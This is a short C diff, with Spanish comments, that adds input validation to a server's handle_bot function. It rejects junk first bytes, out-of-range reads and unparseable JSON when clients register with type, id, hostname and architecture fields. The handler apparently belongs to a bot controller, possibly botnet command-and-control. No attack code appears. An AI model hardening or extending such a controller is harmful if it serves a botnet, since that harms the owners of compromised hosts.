@@ -429,6 +429,10 @@ void *handle_bot(void *arg) {
         // Plain text starts with 'R' (REGISTER) or '{' (JSON)
         if ((unsigned char)first_byte == 0x16) {
             use_ssl = 1;
+        } else if (first_byte != 'R' && first_byte != '{') {
+            // Datos basura/exploit - rechazar conexión
+            close(client_sock);
+            return NULL;
         }
     }
     
@@ -460,6 +464,16 @@ void *handle_bot(void *arg) {
         }
     }
     
+    // Validar que buffer tenga datos válidos
+    if (n <= 0 || n >= sizeof(buffer)) {
+        if (ssl) {
+            SSL_shutdown(ssl);
+            SSL_free(ssl);
+        }
+        close(client_sock);
+        return NULL;
+    }
+    
     buffer[n] = '\0';
     
     // Parse handshake (JSON or REGISTER format)
@@ -471,6 +485,17 @@ void *handle_bot(void *arg) {
     if (buffer[0] == '{') {
         // JSON format (full bots)
         struct json_object *parsed_json = json_tokener_parse(buffer);
+        
+        if (parsed_json == NULL) {
+            // JSON inválido - rechazar
+            if (ssl) {
+                SSL_shutdown(ssl);
+                SSL_free(ssl);
+            }
+            close(client_sock);
+            return NULL;
+        }
+        
         struct json_object *type_obj, *id_obj, *hostname_obj, *arch_obj;
         
         json_object_object_get_ex(parsed_json, "type", &type_obj);
